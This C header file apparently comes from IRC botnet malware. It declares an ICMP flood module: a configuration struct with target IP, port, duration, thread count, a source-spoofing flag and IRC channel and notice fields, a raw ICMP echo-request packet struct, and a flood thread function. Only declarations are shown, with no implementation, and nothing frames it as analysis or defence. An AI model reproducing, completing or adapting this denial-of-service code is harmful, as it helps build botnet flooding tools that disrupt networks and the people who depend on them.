#ifndef NO_ICMP
typedef struct ICMPFLOOD {

	SOCKET sock;
	char ip[128];
	char type[128];
	char chan[128];
	int threadnum;
	unsigned short port;
	int time;
	bool spoof;
	bool notice;
	bool silent;
	bool gotinfo;

} ICMPFLOOD;

typedef struct ECHOREQUEST
{
	IPHEADER ipHeader;
    ICMPHEADER icmpHeader;
    char cData[1024];

} ECHOREQUEST;


DWORD WINAPI ICMPFloodThread(LPVOID param);
#endif